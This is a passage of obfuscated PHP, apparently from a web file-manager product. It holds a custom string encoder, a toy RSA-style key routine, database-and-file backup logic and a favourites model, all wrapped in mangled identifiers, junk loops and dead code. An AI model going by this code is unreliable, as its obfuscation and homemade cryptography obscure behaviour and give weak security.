$ÅˆÊ¸¥ˆ[780]; if (!$ØÀ”¼¿‘) { die; } break; case $ëíÈ½ˆÅ[301]: $‚šÀÅå† = $this->owfd051c97a6($”çüšøÖ, base64_encode($ôÃ¦ô®¼ . $‡¸ÃõŒ)); break; case $ëíÈ½ˆÅ[302]: $‚šÀÅå† = $this->owfd051c97a6($”çüšøÖ, md5($ôÃ¦ô®¼ . $‡¸ÃõŒ)); break; $øÖÕÜ³« = $ÅˆÊ¸¥ˆ[781]; if (!$øÖÕÜ³«) { die; } case $ëíÈ½ˆÅ[303]: $”çüšøÖ = base64_encode($”çüšøÖ); $ìÊÒ¼¢ = rand(0, 64); $ã²úªïÛ = $ÅˆÊ¸¥ˆ[782]; $™Öûª¤‡ = $ÁÎ€Á ú[$ìÊÒ¼¢]; $ƒ¾Š€…ä = $ÅˆÊ¸¥ˆ[783]; while ($ƒ¾Š€…ä < $ÅˆÊ¸¥ˆ[702]) { if ($ƒ¾Š€…ä >= 0) { break; } $ƒ¾Š€…ä++; } $›Ùâ¤Òî = md5($™Öûª¤‡ . md5($‡¸ÃõŒ . $™Öûª¤‡) . $‡¸ÃõŒ); $É©ÁÆış = $ÅˆÊ¸¥ˆ[784]; while (strlen($É©ÁÆış) < $ÅˆÊ¸¥ˆ[702]) { if (!$É©ÁÆış) { break; } $É©ÁÆış++; } $›Ùâ¤Òî = substr($›Ùâ¤Òî, $ìÊÒ¼¢ % 8, $ìÊÒ¼¢ % 8 + 7); $á–ºôö = $ÅˆÊ¸¥ˆ[785]; $öéêÂòá = $ëíÈ½ˆÅ[6]; $õâÅ…á¥ = 0; $´ì–Ú² = $ÅˆÊ¸¥ˆ[786]; while (strlen($´ì–Ú²) < $ÅˆÊ¸¥ˆ[60]) { if (!$´ì–Ú²) { break; } $´ì–Ú²++; } $ìì§Ø² = 0; $Îáª†‘ê = 0; for ($õâÅ…á¥ = 0; $õâÅ…á¥ < strlen($”çüšøÖ); $õâÅ…á¥++) { $Îáª†‘ê = $Îáª†‘ê == strlen($›Ùâ¤Òî) ? 0 : $Îáª†‘ê; $ìì§Ø² = ($ìÊÒ¼¢ + strpos($ÁÎ€Á ú, $”çüšøÖ[$õâÅ…á¥]) + ord($›Ùâ¤Òî[$Îáª†‘ê++])) % 64; $öéêÂòá .= $ÁÎ€Á ú[$ìì§Ø²]; } $‚šÀÅå† = hash_encode($™Öûª¤‡ . $öéêÂòá); break; default: $‚šÀÅå† = $this->owfd051c97a6($”çüšøÖ, $‡¸ÃõŒ . $ôÃ¦ô®¼); $îÏ¯™Ú£ = $ÅˆÊ¸¥ˆ[787]; if (!$îÏ¯™Ú£) { die; } break; } $‚šÀÅå† = strrev($•¶áõÊ‹ . $ôÃ¦ô®¼ . $‚šÀÅå†); $†ü†µºü = $ÅˆÊ¸¥ˆ[788]; if ($Ï¥Ôæõé - 1 > 0) { $‚šÀÅå† = $this->khpu86d3adea($‚šÀÅå†, $‡¸ÃõŒ, $Ï¥Ôæõé - 1); } return $‚šÀÅå†; } private function nejacecd3d48($Û­õ€ƒ™, $…¶Øñ‡, $ÑÌïÆ’ = 3) { $°ù‡İÍë =& $_SERVER[Ò°Ì”İ•]; $Øœ÷ÊÕ =& $_SERVER[¦ù÷êöÏ]; if (!is_string($Û­õ€ƒ™) || strlen($Û­õ€ƒ™) < 10) { return !1; } $Û­õ€ƒ™ = trim($Û­õ€ƒ™); $Û­õ€ƒ™ = strrev($Û­õ€ƒ™); $Ô¬õ©òØ = $Û­õ€ƒ™[0]; $ù¹õû”ø = substr($Û­õ€ƒ™, 1, 15); $˜Êº‹ºœ = $°ù‡İÍë[789]; if (strlen($˜Êº‹ºœ) < $°ù‡İÍë[714]) { die; } $Û­õ€ƒ™ = substr($Û­õ€ƒ™, 16); $¹™ÓÊÜƒ = $Øœ÷ÊÕ[300]; switch ($Ô¬õ©òØ) { case $Øœ÷ÊÕ[206]: $ê®ªÖıÑ = $this->eqzg0371cdd8($Û­õ€ƒ™, strrev($…¶Øñ‡ . $ù¹õû”ø)); $§š¤Œé = $°ù‡İÍë[790]; break; case $Øœ÷ÊÕ[122]: $ê®ªÖıÑ = $this->eqzg0371cdd8($Û­õ€ƒ™, strrev($ù¹õû”ø . $…¶Øñ‡)); $§š¬ÕŞË = $°ù‡İÍë[791]; while ($§š¬ÕŞË < $°ù‡İÍë[702]) { if ($§š¬ÕŞË >= 0) { break; } $§š¬ÕŞË++; } break; $‡ıÎÅ•Á = $°ù‡İÍë[792]; case $Øœ÷ÊÕ[301]: $ê®ªÖıÑ = $this->eqzg0371cdd8($Û­õ€ƒ™, base64_encode($ù¹õû”ø . $…¶Øñ‡)); $¯Â­µ¼ = $°ù‡İÍë[793]; while ($¯Â­µ¼ < $°ù‡İÍë[754]) { if ($¯Â­µ¼ >= 0) { break; } $¯Â­µ¼++; } break; case $Øœ÷ÊÕ[302]: $ê®ªÖıÑ = $this->eqzg0371cdd8($Û­õ€ƒ™, md5($ù¹õû”ø . $…¶Øñ‡)); break; case $Øœ÷ÊÕ[303]: $Û­õ€ƒ™ = hash_decode($Û­õ€ƒ™); $±ÛÆ‹˜ = $°ù‡İÍë[794]; while (strlen($±ÛÆ‹˜) < $°ù‡İÍë[60]) { if (!$±ÛÆ‹˜) { break; } $±ÛÆ‹˜++; } $æÎ¬â°§ = $Û­õ€ƒ™[0]; $Û­õ€ƒ™ = substr($Û­õ€ƒ™, 1); $ä“Ì×ğõ = $°ù‡İÍë[795]; $£’Øá¡ƒ = strpos($¹™ÓÊÜƒ, $æÎ¬â°§); $äúÆ¿Öº = md5($æÎ¬â°§ . md5($…¶Øñ‡ . $æÎ¬â°§) . $…¶Øñ‡); $äúÆ¿Öº = substr($äúÆ¿Öº, $£’Øá¡ƒ % 8, $£’Øá¡ƒ % 8 + 7); $’ı½Øùß = $°ù‡İÍë[796]; $½üœŒì— = $Øœ÷ÊÕ[6]; $†Ã”ë°× = $°ù‡İÍë[797]; if (!$†Ã”ë°×) { die; } $¼Œ¨ğ¶– = 0; $˜»Çˆ²¼ = $°ù‡İÍë[798]; while (strlen($˜»Çˆ²¼) < $°ù‡İÍë[60]) { if (!$˜»Çˆ²¼) { break; } $˜»Çˆ²¼++; } $ş‘Øµ³Ä = 0; $¥İ–ó§ = 0; for ($¼Œ¨ğ¶– = 0; $¼Œ¨ğ¶– < strlen($Û­õ€ƒ™); $¼Œ¨ğ¶–++) { $¥İ–ó§ = $¥İ–ó§ == strlen($äúÆ¿Öº) ? 0 : $¥İ–ó§; $ù²ÚÜ–§ = $°ù‡İÍë[799]; if (strlen($ù²ÚÜ–§) < $°ù‡İÍë[60]) { return; } $¡–“¹ º = $¥İ–ó§++; $šüùØùé = $°ù‡İÍë[800]; $ş‘Øµ³Ä = strpos($¹™ÓÊÜƒ, $Û­õ€ƒ™[$¼Œ¨ğ¶–]) - $£’Øá¡ƒ - ord($äúÆ¿Öº[$¡–“¹ º]); $–Íóô‹ = $°ù‡İÍë[801]; if (strlen($–Íóô‹) < $°ù‡İÍë[754]) { return; } while ($ş‘Øµ³Ä < 0) { $ş‘Øµ³Ä += 64; } $½üœŒì— .= $¹™ÓÊÜƒ[$ş‘Øµ³Ä]; $àÓÃ§ğí = $°ù‡İÍë[802]; } $ê®ªÖıÑ = base64_decode($½üœŒì—); break; default: $ê®ªÖıÑ = $this->eqzg0371cdd8($Û­õ€ƒ™, $…¶Øñ‡ . $ù¹õû”ø); $ŞŞ”øó§ = $°ù‡İÍë[803]; if (!$ŞŞ”øó§) { die; } break; $¹›©¨±¾ = $°ù‡İÍë[804]; while ($¹›©¨±¾ < $°ù‡İÍë[702]) { if ($¹›©¨±¾ >= 0) { break; } $¹›©¨±¾++; } } if ($ÑÌïÆ’ - 1 > 0) { $ê®ªÖıÑ = $this->nejacecd3d48($ê®ªÖıÑ, $…¶Øñ‡, $ÑÌïÆ’ - 1); } return $ê®ªÖıÑ; } public function lhmj75c9ca20($ùÍˆ†•°) { $ïÆè–Èš =& $_SERVER[Ò°Ì”İ•]; $ˆªÀÅ† =& $_SERVER[¦ù÷êöÏ]; $Ã±×Ã” = $this->pyvbdc3b0f32(); $¡Ÿ‚˜ = $this->pyvbdc3b0f32(); $¶â¼–Î— = ($Ã±×Ã” - 1) * ($¡Ÿ‚˜ - 1); $ï´¡Æï‚ = intval(($Ã±×Ã” + $¡Ÿ‚˜) / 2); while (1) { $€§şÂ‰Û = $ï´¡Æï‚; $—ÜêáŒû = $ïÆè–Èš[805]; while (strlen($—ÜêáŒû) < $ïÆè–Èš[705]) { if (!$—ÜêáŒû) { break; } $—ÜêáŒû++; } $®³°ˆ°Ï = $¶â¼–Î—; while ($®³°ˆ°Ï % $€§şÂ‰Û != 0) { $«‹Œƒš‹ = $®³°ˆ°Ï; $®³°ˆ°Ï = $€§şÂ‰Û; $€§şÂ‰Û = $«‹Œƒš‹ % $€§şÂ‰Û; $œ¶ôÑïš = $ïÆè–Èš[806]; } if ($€§şÂ‰Û == 1) { break; } else { $ï´¡Æï‚++; } } $Öºø²÷æ = 2; $à´…ıÛí = $ïÆè–Èš[807]; while (strlen($à´…ıÛí) < $ïÆè–Èš[60]) { if (!$à´…ıÛí) { break; } $à´…ıÛí++; } for ($»æİ¦—ã = 0; $»æİ¦—ã < $¶â¼–Î— * 10; $»æİ¦—ã++) { if (($¶â¼–Î— * $»æİ¦—ã + 1) % $ï´¡Æï‚ == 0) { $Öºø²÷æ = intval(($¶â¼–Î— * $»æİ¦—ã + 1) / $ï´¡Æï‚); break; } } $Ö×íİ”Ú = $this->owfd051c97a6($Ã±×Ã” * $¡Ÿ‚˜ . $ˆªÀÅ†[6], $ˆªÀÅ†[136]); $´¡¹•®Ë = md5($ˆªÀÅ†[304] . ($Ã±×Ã” + $¡Ÿ‚˜) . $ˆªÀÅ†[305] . $ï´¡Æï‚ . $ˆªÀÅ†[305] . $Öºø²÷æ . $ˆªÀÅ†[306]); $×¼¥±³ = $ïÆè–Èš[808]; if (strlen($×¼¥±³) < $ïÆè–Èš[754]) { die; } $¨ŞîŞçÕ = $this->owfd051c97a6($ùÍˆ†•°, $´¡¹•®Ë) . $ˆªÀÅ†[307] . $Ö×íİ”Ú; $‘ÈŒâ×ç = $ïÆè–Èš[809]; if (!$‘ÈŒâ×ç) { return; } return $¨ŞîŞçÕ; $½¸¿êˆ‚ = $ïÆè–Èš[810]; } public function prqieda3a3a8($ïÃúóñ) { $¤ÓàîËÂ =& $_SERVER[Ò°Ì”İ•]; $ê•Œ…šš =& $_SERVER[¦ù÷êöÏ]; $Ä…À·¿¸ = explode($ê•Œ…šš[307], $ïÃúóñ); $ı‡¶¡¹û = $¤ÓàîËÂ[811]; if (!$ı‡¶¡¹û) { return; } if (count($Ä…À·¿¸) != 2) { return $ê•Œ…šš[6]; } $×­ˆûªñ = $this->eqzg0371cdd8($Ä…À·¿¸[1] . $ê•Œ…šš[6], $ê•Œ…šš[136]); if (!$×­ˆûªñ) { return $ê•Œ…šš[6]; } $×­ˆûªñ = intval($×­ˆûªñ); $¨Æ’Èøü = 0; $›î ø¨ = 0; $¨‘Ãáï = $¤ÓàîËÂ[812]; for ($¢è«€«è = 3; $¢è«€«è < $×­ˆûªñ; $¢è«€«è += 2) { if ($×­ˆûªñ % $¢è«€«è != 0) { continue; } $¨Æ’Èøü = $¢è«€«è; $›î ø¨ = intval($×­ˆûªñ / $¢è«€«è); break; } $ñ×õ¬ıÂ = ($¨Æ’Èøü - 1) * ($›î ø¨ - 1); $ÑÇ™ıá = intval(($¨Æ’Èøü + $›î ø¨) / 2); while (1) { $øíï«Ìä = $ÑÇ™ıá; $”ãœçÑ = $ñ×õ¬ıÂ; $§ëÂá¶Ò = $¤ÓàîËÂ[813]; while ($”ãœçÑ % $øíï«Ìä != 0) { $’¾«Ïıç = $”ãœçÑ; $”ãœçÑ = $øíï«Ìä; $øíï«Ìä = $’¾«Ïıç % $øíï«Ìä; $œ˜“š Ú = $¤ÓàîËÂ[814]; while ($œ˜“š Ú < $¤ÓàîËÂ[702]) { if ($œ˜“š Ú >= 0) { break; } $œ˜“š Ú++; } } if ($øíï«Ìä == 1) { break; } else { $ÑÇ™ıá++; } } $ëààÊĞÆ = 2; for ($¢è«€«è = 0; $¢è«€«è < $ñ×õ¬ıÂ * 10; $¢è«€«è++) { if (($ñ×õ¬ıÂ * $¢è«€«è + 1) % $ÑÇ™ıá == 0) { $ëààÊĞÆ = intval(($ñ×õ¬ıÂ * $¢è«€«è + 1) / $ÑÇ™ıá); break; } } $ãúòíŸã = md5($ê•Œ…šš[304] . ($¨Æ’Èøü + $›î ø¨) . $ê•Œ…šš[305] . $ÑÇ™ıá . $ê•Œ…šš[305] . $ëààÊĞÆ . $ê•Œ…šš[306]); $ê»§Î±® = $¤ÓàîËÂ[815]; while (strlen($ê»§Î±®) < $¤ÓàîËÂ[714]) { if (!$ê»§Î±®) { break; } $ê»§Î±®++; } $Í“Œ‹¶³ = $this->eqzg0371cdd8($Ä…À·¿¸[0], $ãúòíŸã); return $Í“Œ‹¶³; } public function pyvbdc3b0f32() { $“ „×¬İ =& $_SERVER[Ò°Ì”İ•]; $èš£×Ë = mt_rand(pow(2, 14), pow(2, 16) - 1); $œÉâà³¶ = array(); $İŠƒã = 1; while ($İŠƒã <= (int) sqrt($èš£×Ë)) { $Õ¡¥¹ØÅ = $İŠƒã; while (!0) { $Õ¡¥¹ØÅ++; if ($Õ¡¥¹ØÅ <= 2) { $İŠƒã = $Õ¡¥¹ØÅ; break; } else { if ($Õ¡¥¹ØÅ < 2) { continue; } } $·éöœıö = !0; for ($«à‡¥Ò¬ = 2; $«à‡¥Ò¬ <= sqrt($Õ¡¥¹ØÅ); $«à‡¥Ò¬++) { if ($Õ¡¥¹ØÅ % $«à‡¥Ò¬ == 0) { $·éöœıö = !1; } } if ($·éöœıö) { $İŠƒã = $Õ¡¥¹ØÅ; break; } } $œÉâà³¶[] = $İŠƒã; $Œº¯´à = $“ „×¬İ[816]; if (strlen($Œº¯´à) < $“ „×¬İ[754]) { return; } } $’›İ€¡ = 2; $°Š¢Ùİò = $“ „×¬İ[817]; while (strlen($°Š¢Ùİò) < $“ „×¬İ[754]) { if (!$°Š¢Ùİò) { break; } $°Š¢Ùİò++; } for ($Õ¡¥¹ØÅ = $èš£×Ë; $Õ¡¥¹ØÅ > 1; $Õ¡¥¹ØÅ--) { $·éöœıö = !0; $ìàøó·µ = $“ „×¬İ[818]; foreach ($œÉâà³¶ as $†¢Šøí¬) { if ($Õ¡¥¹ØÅ % $†¢Šøí¬ == 0) { $·éöœıö = !1; break; } } if ($·éöœıö) { $’›İ€¡ = $Õ¡¥¹ØÅ; break; } } return $’›İ€¡; $â®íÃñ = $“ „×¬İ[819]; if (!$â®íÃñ) { return; } } public function fehkcbdea055($œ¥×ë¸Š, $”á Š•‰) { $——»ñÑ =& $_SERVER[¦ù÷êöÏ]; return call_user_func(array($——»ñÑ[8], $——»ñÑ[308]), $œ¥×ë¸Š, $”á Š•‰); } public function owfd051c97a6($€ƒ£ğşÈ, $è«ÕÕ¶´) { $à„œì»â =& $_SERVER[¦ù÷êöÏ]; return call_user_func(array($à„œì»â[309], $à„œì»â[310]), $€ƒ£ğşÈ, $è«ÕÕ¶´); $ÁÃßÏÅ = $_SERVER[Ò°Ì”İ•][820]; } public function eqzg0371cdd8($Ô“¢ë´Ö, $·ˆÕ²¥Ç) { $üõƒîİ· =& $_SERVER[¦ù÷êöÏ]; return call_user_func(array($üõƒîİ·[309], $üõƒîİ·[311]), $Ô“¢ë´Ö, $·ˆÕ²¥Ç); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Ò°Ì”İ•][821]); $this->init(); $this->keep(); } public function init() { $ğÃŠ£•ô =& $_SERVER[Ò°Ì”İ•]; $this->isManual(); self::$name = date($ğÃŠ£•ô[822]); if (!($ØñŸÚÈ = $this->model->lastItem())) { $ØñŸÚÈ = $this->initData(); } else { self::$name = $ØñŸÚÈ[$ğÃŠ£•ô[32]]; if ($ØñŸÚÈ[$ğÃŠ£•ô[823]] == $ğÃŠ£•ô[102]) { self::$name = date($ğÃŠ£•ô[272]); $€ıĞè¾Œ = intval(_get($ØñŸÚÈ, $ğÃŠ£•ô[824], 0)); if (self::$manual == 0 && $ØñŸÚÈ[$ğÃŠ£•ô[32]] == self::$name) { $this->model->remove($ØñŸÚÈ[$ğÃŠ£•ô[487]]); } $ØñŸÚÈ = $this->initData($€ıĞè¾Œ, $ØñŸÚÈ[$ğÃŠ£•ô[825]]); } else { $this->checkStore($ØñŸÚÈ[$ğÃŠ£•ô[825]]); } } self::$option = $ØñŸÚÈ; } private function isManual() { $ğÜÃ²û² = _get($GLOBALS, $_SERVER[Ò°Ì”İ•][826], 0); $ğÜÃ²û² = intval($ğÜÃ²û²); self::$manual = $ğÜÃ²û² && $ğÜÃ²û² == 1 ? 1 : 0; } private function initData($‡´şâ©“ = 0, $­˜—ÒêÕ = '') { $İÈ¾æŠÀ =& $_SERVER[Ò°Ì”İ•]; $ÎóåÂÙƒ = $this->model->config(); if ($­˜—ÒêÕ && $ÎóåÂÙƒ[$İÈ¾æŠÀ[825]] != $­˜—ÒêÕ) { $‡´şâ©“ = 0; } $this->checkStore($ÎóåÂÙƒ[$İÈ¾æŠÀ[825]]); if (self::$manual == 1) { self::$name .= $İÈ¾æŠÀ[11] . date($İÈ¾æŠÀ[827]); } $Ú¶Áìí½ = array($İÈ¾æŠÀ[825] => $ÎóåÂÙƒ[$İÈ¾æŠÀ[825]], $İÈ¾æŠÀ[32] => self::$name, $İÈ¾æŠÀ[823] => 0, $İÈ¾æŠÀ[182] => $ÎóåÂÙƒ[$İÈ¾æŠÀ[182]], $İÈ¾æŠÀ[828] => self::$manual, $İÈ¾æŠÀ[380] => array($İÈ¾æŠÀ[829] => array($İÈ¾æŠÀ[823] => 0), $İÈ¾æŠÀ[830] => array($İÈ¾æŠÀ[823] => 0, $İÈ¾æŠÀ[831] => 0, $İÈ¾æŠÀ[832] => 0, $İÈ¾æŠÀ[33] => $İÈ¾æŠÀ[12], $İÈ¾æŠÀ[833] => 0, $İÈ¾æŠÀ[834] => 0), $İÈ¾æŠÀ[835] => array($İÈ¾æŠÀ[823] => 0, $İÈ¾æŠÀ[831] => 0, $İÈ¾æŠÀ[832] => 0, $İÈ¾æŠÀ[833] => 0, $İÈ¾æŠÀ[834] => 0), $İÈ¾æŠÀ[243] => array($İÈ¾æŠÀ[823] => 0, $İÈ¾æŠÀ[836] => 0, $İÈ¾æŠÀ[837] => 0, $İÈ¾æŠÀ[838] => 0, $İÈ¾æŠÀ[839] => 0, $İÈ¾æŠÀ[553] => $‡´şâ©“, $İÈ¾æŠÀ[833] => 0, $İÈ¾æŠÀ[834] => 0)), $İÈ¾æŠÀ[833] => time(), $İÈ¾æŠÀ[834] => 0); $Ï°È¦Ñ· = $this->model->insert($Ú¶Áìí½); $Ú¶Áìí½[$İÈ¾æŠÀ[487]] = $Ï°È¦Ñ·; return $Ú¶Áìí½; } private function checkStore($ ¸§„Ø“) { $˜¸„ò¤â = Model($_SERVER[Ò°Ì”İ•][840]); $•Íö£İô = $˜¸„ò¤â->listData($ ¸§„Ø“); $˜¸„ò¤â->checkConfig($•Íö£İô); } public static function get() { if (!self::$option) { $¥ŸÖ¡Ÿ¶ = Model($_SERVER[Ò°Ì”İ•][821]); $ó¼ÌÒíì = $¥ŸÖ¡Ÿ¶->findByName(self::$name); $¥ŸÖ¡Ÿ¶->parseContent($ó¼ÌÒíì); self::$option = $ó¼ÌÒíì; } return self::$option; } public static function set($ÎÔÍâÏ£) { $¥›ÙóÕ­ =& $_SERVER[Ò°Ì”İ•]; $­˜àÛã× = self::get(); foreach ($ÎÔÍâÏ£ as $Õ‘ÜË²º => $Â³Ş’èõ) { array_set_value($­˜àÛã×, $Õ‘ÜË²º, $Â³Ş’èõ); } Model($¥›ÙóÕ­[821])->update($­˜àÛã×[$¥›ÙóÕ­[487]], $­˜àÛã×); self::$option = $­˜àÛã×; return self::$option; } public function keep() { $Ÿ¿†¬çÑ =& $_SERVER[Ò°Ì”İ•]; $ó½Î§ = self::get(); if (_get($ó½Î§, $Ÿ¿†¬çÑ[841], 0) == $Ÿ¿†¬çÑ[102]) { return; } $this->backupKeep($ó½Î§); self::set(array($Ÿ¿†¬çÑ[841] => 1)); } private function backupKeep($Ûé¬óä) { $¤Œ÷¨ÕÈ =& $_SERVER[Ò°Ì”İ•]; if (self::$manual == 1) { return; } $°›°ó¬õ = $this->model->listData(); if (empty($°›°ó¬õ)) { return; } $¢ƒ¤èğ = 0; $®Úãè¡ß = array(); foreach ($°›°ó¬õ as $ÉÌ¦É–Ú) { if ($¢ƒ¤èğ >= 7) { break; } $®Úãè¡ß[] = $ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[32]]; $¢ƒ¤èğ++; } for ($¢ƒ¤èğ = 0; $¢ƒ¤èğ < 12; $¢ƒ¤èğ++) { $®Úãè¡ß[] = date($¤Œ÷¨ÕÈ[842], strtotime("\55{$¢ƒ¤èğ}\x20\155\x6f\x6e\x74\150\x73")); } $®Úãè¡ß = array_unique($®Úãè¡ß); $ÊÀÍü‰ğ = Model($¤Œ÷¨ÕÈ[843])->get($¤Œ÷¨ÕÈ[844]); foreach ($°›°ó¬õ as $ÉÌ¦É–Ú) { if (isset($ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[828]]) && $ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[828]] == $¤Œ÷¨ÕÈ[102]) { continue; } if (!empty($ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[32]]) && in_array($ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[32]], $®Úãè¡ß)) { continue; } $this->model->remove($ÉÌ¦É–Ú[$¤Œ÷¨ÕÈ[487]]); $ÈõÑÍÕö = $this->backupPath($Ûé¬óä, $ÊÀÍü‰ğ); IO::remove($ÈõÑÍÕö, !1); } } private function backupPath($½şçÚİ–, $˜¾ñïí = false) { $ÏÙƒ‹˜¼ =& $_SERVER[Ò°Ì”İ•]; if (!$˜¾ñïí) { $˜¾ñïí = Model($ÏÙƒ‹˜¼[843])->get($ÏÙƒ‹˜¼[844]); } $ªé–ŞÖÜ = $½şçÚİ–[$ÏÙƒ‹˜¼[32]]; $Šî’¾Û‰ = substr(md5($ÏÙƒ‹˜¼[845] . $˜¾ñïí . $ªé–ŞÖÜ), 0, 8); return "\x7b\x69\157\x3a{$½şçÚİ–[$ÏÙƒ‹˜¼[825]]}\175\x2f\144\141\164\141\142\x61\163\x65\x2f\x62\x61\143\153\x75\x70\57" . $ªé–ŞÖÜ . $ÏÙƒ‹˜¼[11] . $Šî’¾Û‰; } public function db() { $ŸĞ¡ =& $_SERVER[Ò°Ì”İ•]; $‘Ìö“Ã = self::get(); if (_get($‘Ìö“Ã, $ŸĞ¡[846], 0) == $ŸĞ¡[102]) { return !0; } $“éÆ©Ä = new BackupDb(); if (!$“éÆ©Ä->index()) { return !1; } self::set(array($ŸĞ¡[846] => 1)); return !0; } public function dbFile() { $•õìÄÆÄ =& $_SERVER[Ò°Ì”İ•]; $öñö¹å = self::get(); if (_get($öñö¹å, $•õìÄÆÄ[847], 0) == $•õìÄÆÄ[102]) { return !0; } $ÆöÂÛÜ® = new BackupDbFile(); if (!$ÆöÂÛÜ®->index()) { return !1; } self::set(array($•õìÄÆÄ[847] => 1)); return !0; } public function file() { $¹ÚâË³Ë =& $_SERVER[Ò°Ì”İ•]; $Ù“‰†Ê½ = self::get(); if (_get($Ù“‰†Ê½, $¹ÚâË³Ë[848], 0) == $¹ÚâË³Ë[102]) { return !0; } if ($Ù“‰†Ê½[$¹ÚâË³Ë[182]] == $¹ÚâË³Ë[849]) { $ó£ÒÙ© = new BackupFile(); if (!$ó£ÒÙ©->index()) { return !1; } } self::set(array($¹ÚâË³Ë[848] => 1, $¹ÚâË³Ë[823] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‹„®ãº =& $_SERVER[Ò°Ì”İ•]; $–å ©—£ = Backup::get(); self::$io = $–å ©—£[$‹„®ãº[825]]; self::$name = $–å ©—£[$‹„®ãº[32]]; $º¬¥Á« = new DbManage(); $ı·ËÄ‘Ğ = $º¬¥Á«->dbType(); $íª¤Í¬¬ = array($‹„®ãº[850] => $ı·ËÄ‘Ğ, $‹„®ãº[851] => time()); Backup::set($íª¤Í¬¬); $æîÓÃ½ = $this->tmpFilesPath() . $‹„®ãº[852] . self::$name . $‹„®ãº[8]; del_dir($æîÓÃ½); mk_dir($æîÓÃ½); $æ½¬ºğÑ = $È²ˆÕí‚ = 0; try { $¥õá½ö÷ = $º¬¥Á«->db()->getTables(); } catch (Exception $¦áµ”ÒÚ) { return !1; } $¥õá½ö÷ = array_diff($¥õá½ö÷, array($‹„®ãº[853], $‹„®ãº[854])); foreach ($¥õá½ö÷ as $À¼Ì°®Š) { if ($À¼Ì°®Š == $‹„®ãº[855]) { continue; } $æ½¬ºğÑ += $º¬¥Á«->model($À¼Ì°®Š)->count(); } $æ÷ú·¶ = new Task($‹„®ãº[856], $‹„®ãº[857], $æ½¬ºğÑ, LNG($‹„®ãº[858]) . $‹„®ãº[859] . LNG($‹„®ãº[860])); $GLOBALS[$‹„®ãº[861]] = self::$name; foreach ($¥õá½ö÷ as $À¼Ì°®Š) { $Æ”ˆåà¼ = $æîÓÃ½ . $À¼Ì°®Š . $‹„®ãº[862]; if ($À¼Ì°®Š == $‹„®ãº[855]) { @touch($Æ”ˆåà¼); continue; } $üÈë’£÷ = null; if ($À¼Ì°®Š == $‹„®ãº[863] && $–å ©—£[$‹„®ãº[182]] == $‹„®ãº[849]) { $üÈë’£÷ = self::$io; } $È²ˆÕí‚ += $º¬¥Á«->sqlFromDb($À¼Ì°®Š, $Æ”ˆåà¼, $æ÷ú·¶, $üÈë’£÷); } unset($GLOBALS[$‹„®ãº[861]]); $æ÷ú·¶->end(); if ($È²ˆÕí‚ > $æ½¬ºğÑ) { $æ½¬ºğÑ = $È²ˆÕí‚; } $íª¤Í¬¬ = array($‹„®ãº[850] => $ı·ËÄ‘Ğ, $‹„®ãº[846] => 1, $‹„®ãº[864] => $æ½¬ºğÑ, $‹„®ãº[865] => $È²ˆÕí‚, $‹„®ãº[866] => time()); Backup::set($íª¤Í¬¬); if ($æ½¬ºğÑ - $È²ˆÕí‚ > 0) { $™ƒšÀê = $‹„®ãº[867]; if (!stristr(I18n::getType(), $‹„®ãº[868])) { $™ƒšÀê = $‹„®ãº[869]; } write_log(array($™ƒšÀê, $íª¤Í¬¬), $‹„®ãº[857]); return !1; } return !0; } private function tmpFilesPath() { $½Â÷×Ñº =& $_SERVER[Ò°Ì”İ•]; $¹øÒ©‘ = TEMP_FILES; if ($GLOBALS[$½Â÷×Ñº[6]][$½Â÷×Ñº[103]][$½Â÷×Ñº[870]]) { $¹øÒ©‘ = $GLOBALS[$½Â÷×Ñº[6]][$½Â÷×Ñº[103]][$½Â÷×Ñº[870]]; if (!mk_dir($¹øÒ©‘) || !is_writable($¹øÒ©‘) || !IO::mkfile($¹øÒ©‘ . $½Â÷×Ñº[871])) { $¹øÒ©‘ = TEMP_FILES; } } return $¹øÒ©‘; } } goto CÇãµÕ¡; dø……­âÊ»: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($ ôŞ•°Ç) { $»À¶¾Ó¨ =& $_SERVER[Ò°Ì”İ•]; return array($»À¶¾Ó¨[2084] => array(USER_ID, $»À¶¾Ó¨[2454])); } protected function listData() { $ã¨ªã§À =& $_SERVER[Ò°Ì”İ•]; $µî”µÂ = array($ã¨ªã§À[1759] => USER_ID, $ã¨ªã§À[569] => 0); $„ä‹ŠŸñ = $ã¨ªã§À[2455]; $ª‡ÕŠ­æ = $this->field($„ä‹ŠŸñ)->where($µî”µÂ)->order($ã¨ªã§À[2456])->select(); return $ª‡ÕŠ­æ ? $ª‡ÕŠ­æ : array(); } protected function resetCache() { } protected function listView() { $ûŸÊÏ¦ã =& $_SERVER[Ò°Ì”İ•]; $â±‰ı‡£ = $this->listData(); $Åæº°Úª = array_filter_by_field($â±‰ı‡£, $ûŸÊÏ¦ã[33], $ûŸÊÏ¦ã[502]); $ÊÄÄò‹„ = array_to_keyvalue($Åæº°Úª, $ûŸÊÏ¦ã[12], $ûŸÊÏ¦ã[98]); if (!$ÊÄÄò‹„) { return $â±‰ı‡£; } $Ï×½à¨³ = 2000; $ËŒ‘Š°± = array($ûŸÊÏ¦ã[503] => array($ûŸÊÏ¦ã[504], $ÊÄÄò‹„)); $ÊÕ¶ÎãÅ = Model($ûŸÊÏ¦ã[898])->listSource($ËŒ‘Š°±, $Ï×½à¨³); $ÊÕ¶ÎãÅ = array_merge($ÊÕ¶ÎãÅ[$ûŸÊÏ¦ã[97]], $ÊÕ¶ÎãÅ[$ûŸÊÏ¦ã[96]]); $ÊÕ¶ÎãÅ = array_to_keyvalue($ÊÕ¶ÎãÅ, $ûŸÊÏ¦ã[204]); foreach ($â±‰ı‡£ as $¥¸ş–£õ => $ë·ˆ™Ë) { $ªöÆ¨Õ = $ÊÕ¶ÎãÅ[$ë·ˆ™Ë[$ûŸÊÏ¦ã[98]]]; $ªöÆ¨Õ = $ªöÆ¨Õ ? $ªöÆ¨Õ : array(); $â±‰ı‡£[$¥¸ş–£õ] = array_merge($ªöÆ¨Õ, $ë·ˆ™Ë); } return $â±‰ı‡£; } protected function addFav($ªÖŞ²óÙ, $—¤Ö¹º = '', $åÜ¬ªÕœ = "\163\157\165\x72\143\x65") { $•Õ‘˜«ì =& 